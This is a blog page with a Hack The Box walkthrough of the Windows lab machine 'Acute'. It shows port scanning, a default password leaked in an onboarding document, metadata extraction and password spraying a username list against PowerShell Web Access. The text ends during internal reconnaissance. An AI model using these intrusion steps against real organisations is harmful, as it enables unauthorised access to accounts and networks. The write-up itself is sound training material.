@@ -1,0 +1,662 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="introduceOS:	 WindowsDifficulty:	HardPoints:	40Release:	12 Feb 2022IP:	10.10.11.145">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hack-The-Box-walkthrough[acute]">
+<meta property="og:url" content="https://fdlucifer.github.io/2022/02/16/acute/index.html">
+<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
+<meta property="og:description" content="introduceOS:	 WindowsDifficulty:	HardPoints:	40Release:	12 Feb 2022IP:	10.10.11.145">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2150.jpg">
+<meta property="og:image" content="http://www.hackthebox.eu/badge/image/235857">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2151.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2152.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2153.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2154.jpg">
+<meta property="article:published_time" content="2022-02-16T14:45:25.000Z">
+<meta property="article:modified_time" content="2022-07-17T07:57:21.154Z">
+<meta property="article:author" content="lUc1f3r11">
+<meta property="article:tag" content="HackTheBox靶机练习">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2150.jpg">
+
+
+<link rel="canonical" href="https://fdlucifer.github.io/2022/02/16/acute/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2022/02/16/acute/","path":"2022/02/16/acute/","title":"Hack-The-Box-walkthrough[acute]"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Hack-The-Box-walkthrough[acute] | lUc1f3r11's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">lUc1f3r11's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">203</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#introduce"><span class="nav-number">1.</span> <span class="nav-text">introduce</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Enumeration"><span class="nav-number">2.</span> <span class="nav-text">Enumeration</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#NMAP"><span class="nav-number">2.1.</span> <span class="nav-text">NMAP</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Summary-of-knowledge"><span class="nav-number">3.</span> <span class="nav-text">Summary of knowledge</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Contact-me"><span class="nav-number">4.</span> <span class="nav-text">Contact me</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
+      src="/images/lucifer11.jpg">
+  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
+  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">203</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="custom mastodon fa-fw"></i>infosec.exchange</span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2022/02/16/acute/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lucifer11.jpg">
+      <meta itemprop="name" content="lUc1f3r11">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lUc1f3r11's blog">
+      <meta itemprop="description" content="All things about infosec & ctf">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Hack-The-Box-walkthrough[acute] | lUc1f3r11's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Hack-The-Box-walkthrough[acute]
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2022-02-16 22:45:25" itemprop="dateCreated datePublished" datetime="2022-02-16T22:45:25+08:00">2022-02-16</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-07-17 15:57:21" itemprop="dateModified" datetime="2022-07-17T15:57:21+08:00">2022-07-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/HackTheBox-walkthrough/" itemprop="url" rel="index"><span itemprop="name">HackTheBox walkthrough</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="introduce"><a href="#introduce" class="headerlink" title="introduce"></a>introduce</h1><p>OS:	 Windows<br>Difficulty:	Hard<br>Points:	40<br>Release:	12 Feb 2022<br>IP:	10.10.11.145</p>
+<ul>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2150.jpg"></p>
+</li>
+<li><p><img src="http://www.hackthebox.eu/badge/image/235857" alt="my htb rank"></p>
+</li>
+</ul>
+<span id="more"></span>
+
+<h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h2 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/acute]</span><br><span class="line">└─<span class="comment"># nmap -sV -v -p- --min-rate=10000 10.10.11.145</span></span><br><span class="line">PORT    STATE SERVICE  VERSION</span><br><span class="line">443/tcp open  ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure>
+
+<p>We have only one TCP port and it gives us hostname. Let’s add it to our hosts file and access the web.</p>
+<p>It looks like a healthcare website. Under ‘About Us’ you will get employee&#x2F;user names as well as from right top corner you will get a document file ‘New Starter Forms’.</p>
+<p>Download the document. It is a induction checklist for new employees.</p>
+<p>From this document we will get couple crucial things.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">IT overview</span><br><span class="line"></span><br><span class="line">Arrange <span class="keyword">for</span> the new starter to receive a demonstration on using IT tools <span class="built_in">which</span> may include MUSE, myJob and Google accounts. Walk the new starter through the password change policy, they will need to change it from the default Password1!. Not all staff are changing these so please be sure to run through this.</span><br></pre></td></tr></table></figure>
+
+<p>The default password is Password1! and some staff members are still using the same password for their account. We have a PSWA (PowerShell WebAccess) session&#x2F;configuration name dc_manage</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Initial Probation Meeting (For Academic staff on Probation only)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Arrange initial probation meeting between Probationer, Head of Department and Probation Adviser.</span><br><span class="line"></span><br><span class="line">Run through the new PSWA to highlight the restrictions <span class="built_in">set</span> on the sessions named dc_manage.</span><br><span class="line"></span><br><span class="line">The probation plan should be completed within a month of the start <span class="built_in">date</span> and should include a requirement to register with LETs re: rate to gain within 3 months of starting. Fellowship of the Higher Education Academy (FHEA). </span><br></pre></td></tr></table></figure>
+
+<p>We also have link to PSWA <span class="exturl" data-url="aHR0cHM6Ly9hdHNzZXJ2ZXIuYWN1dGUubG9jYWwvQWN1dGVfU3RhZmZfQWNjZXNz">https://atsserver.acute.local/Acute_Staff_Access<i class="fa fa-external-link-alt"></i></span></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Induction meetings with management staff</span><br><span class="line"></span><br><span class="line">Arrange <span class="keyword">for</span> the new starter to meet with other staff <span class="keyword">in</span> the department as appropriate. This could include the Head of Department and/or other members of the appointee’s team. Complete the https://atsserver.acute.local/Acute_Staff_Access training</span><br><span class="line"></span><br><span class="line">Induction Coordinator</span><br></pre></td></tr></table></figure>
+
+<p>Now we can access the remote powershell via browser. Lastly, Lois user has highest privileges and she can change group membership of any user for group called site admin</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">**Lois is the only authorized personnel to change Group Membership, Contact Lois to have this approved and changed <span class="keyword">if</span> required. Only Lois can become site admin. **</span><br></pre></td></tr></table></figure>
+
+<p>Now we have couple things in loot box, let’s access PSWA.</p>
+<p>Se need username, password and computer name. So far we have employee names from website, we have default password. But we don’t have computer name.</p>
+<p>If we run exiftool on this downloaded docx file, we will get remaining information.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/acute]</span><br><span class="line">└─<span class="comment"># exiftool New_Starter_CheckList_v7.docx </span></span><br><span class="line">ExifTool Version Number         : 12.39</span><br><span class="line">File Name                       : New_Starter_CheckList_v7.docx</span><br><span class="line">Directory                       : .</span><br><span class="line">File Size                       : 34 KiB</span><br><span class="line">File Modification Date/Time     : 2022:02:16 10:07:39-05:00</span><br><span class="line">File Access Date/Time           : 2022:02:16 10:09:02-05:00</span><br><span class="line">File Inode Change Date/Time     : 2022:02:16 10:08:07-05:00</span><br><span class="line">File Permissions                : -rw-r--r--</span><br><span class="line">File Type                       : DOCX</span><br><span class="line">File Type Extension             : docx</span><br><span class="line">MIME Type                       : application/vnd.openxmlformats-officedocument.wordprocessingml.document</span><br><span class="line">Zip Required Version            : 20</span><br><span class="line">Zip Bit Flag                    : 0x0006</span><br><span class="line">Zip Compression                 : Deflated</span><br><span class="line">Zip Modify Date                 : 1980:01:01 00:00:00</span><br><span class="line">Zip CRC                         : 0x079b7eb2</span><br><span class="line">Zip Compressed Size             : 428</span><br><span class="line">Zip Uncompressed Size           : 2527</span><br><span class="line">Zip File Name                   : [Content_Types].xml</span><br><span class="line">Creator                         : FCastle</span><br><span class="line">Description                     : Created on Acute-PC01</span><br><span class="line">Last Modified By                : Daniel</span><br><span class="line">Revision Number                 : 8</span><br><span class="line">Last Printed                    : 2021:01:04 15:54:00Z</span><br><span class="line">Create Date                     : 2021:12:08 14:21:00Z</span><br><span class="line">Modify Date                     : 2021:12:22 00:39:00Z</span><br><span class="line">Template                        : Normal.dotm</span><br><span class="line">Total Edit Time                 : 2.6 hours</span><br><span class="line">Pages                           : 3</span><br><span class="line">Words                           : 886</span><br><span class="line">Characters                      : 5055</span><br><span class="line">Application                     : Microsoft Office Word</span><br><span class="line">Doc Security                    : None</span><br><span class="line">Lines                           : 42</span><br><span class="line">Paragraphs                      : 11</span><br><span class="line">Scale Crop                      : No</span><br><span class="line">Heading Pairs                   : Title, 1</span><br><span class="line">Titles Of Parts                 : </span><br><span class="line">Company                         : University of Marvel</span><br><span class="line">Links Up To Date                : No</span><br><span class="line">Characters With Spaces          : 5930</span><br><span class="line">Shared Doc                      : No</span><br><span class="line">Hyperlinks Changed              : No</span><br><span class="line">App Version                     : 16.0000</span><br></pre></td></tr></table></figure>
+
+<p>From this metadata we got two things, computer name that is Acute-Pc01 from description and username format FCastle from Creator. Let’s login</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username: EDavies</span><br><span class="line">Password: Password1!</span><br><span class="line">Computer Name: Acute-PC01</span><br></pre></td></tr></table></figure>
+
+<p>We have these employee names, we can save them in a format.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/acute]</span><br><span class="line">└─<span class="comment"># cat users.txt         </span></span><br><span class="line">edavies</span><br><span class="line">chall</span><br><span class="line">awallace</span><br><span class="line">imonks</span><br><span class="line">jmorgon</span><br><span class="line">lhopkins</span><br></pre></td></tr></table></figure>
+
+<p>Out all these usernames, edavies worked with Password1! I believe this employee is still hasn’t changed the default password.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\edavies\Documents&gt; </span><br><span class="line"></span><br><span class="line"><span class="built_in">whoami</span> /groups</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">GROUP INFORMATION</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">Group Name                                 Type             SID          Attributes                                    </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">========================================== ================ ============ ==============================================</span><br><span class="line"></span><br><span class="line">====</span><br><span class="line"></span><br><span class="line">Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled g</span><br><span class="line"></span><br><span class="line">roup</span><br><span class="line"></span><br><span class="line">BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled g</span><br><span class="line"></span><br><span class="line">roup</span><br><span class="line"></span><br><span class="line">BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled g</span><br><span class="line"></span><br><span class="line">roup</span><br><span class="line"></span><br><span class="line">NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled g</span><br><span class="line"></span><br><span class="line">roup</span><br><span class="line"></span><br><span class="line">NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled g</span><br><span class="line"></span><br><span class="line">roup</span><br><span class="line"></span><br><span class="line">NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled g</span><br><span class="line"></span><br><span class="line">roup</span><br><span class="line"></span><br><span class="line">Authentication authority asserted identity Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled g</span><br><span class="line"></span><br><span class="line">roup</span><br><span class="line"></span><br><span class="line">Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                                                </span><br></pre></td></tr></table></figure>
+
+<p>We have edavies shell. If we run ipconfig &#x2F;all then we’d get below info.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\edavies\Documents&gt; </span><br><span class="line"></span><br><span class="line">ipconfig /all</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">Windows IP Configuration</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">   Host Name . . . . . . . . . . . . : Acute-PC01</span><br><span class="line"></span><br><span class="line">   Primary Dns Suffix  . . . . . . . : acute.local</span><br><span class="line"></span><br><span class="line">   Node Type . . . . . . . . . . . . : Hybrid</span><br><span class="line"></span><br><span class="line">   IP Routing Enabled. . . . . . . . : No</span><br><span class="line"></span><br><span class="line">   WINS Proxy Enabled. . . . . . . . : No</span><br><span class="line"></span><br><span class="line">   DNS Suffix Search List. . . . . . : acute.local</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">Ethernet adapter Ethernet 2:</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">   Connection-specific DNS Suffix  . : </span><br><span class="line"></span><br><span class="line">   Description . . . . . . . . . . . : Microsoft Hyper-V Network Adapter <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">   Physical Address. . . . . . . . . : 00-15-5D-E8-0A-01</span><br><span class="line"></span><br><span class="line">   DHCP Enabled. . . . . . . . . . . : No</span><br><span class="line"></span><br><span class="line">   Autoconfiguration Enabled . . . . : Yes</span><br><span class="line"></span><br><span class="line">   Link-<span class="built_in">local</span> IPv6 Address . . . . . : fe80::9513:4361:23ec:64fd%14(Preferred) </span><br><span class="line"></span><br><span class="line">   IPv4 Address. . . . . . . . . . . : 172.16.22.2(Preferred) </span><br><span class="line"></span><br><span class="line">   Subnet Mask . . . . . . . . . . . : 255.255.255.0</span><br><span class="line"></span><br><span class="line">   Default Gateway . . . . . . . . . : 172.16.22.1</span><br><span class="line"></span><br><span class="line">   DHCPv6 IAID . . . . . . . . . . 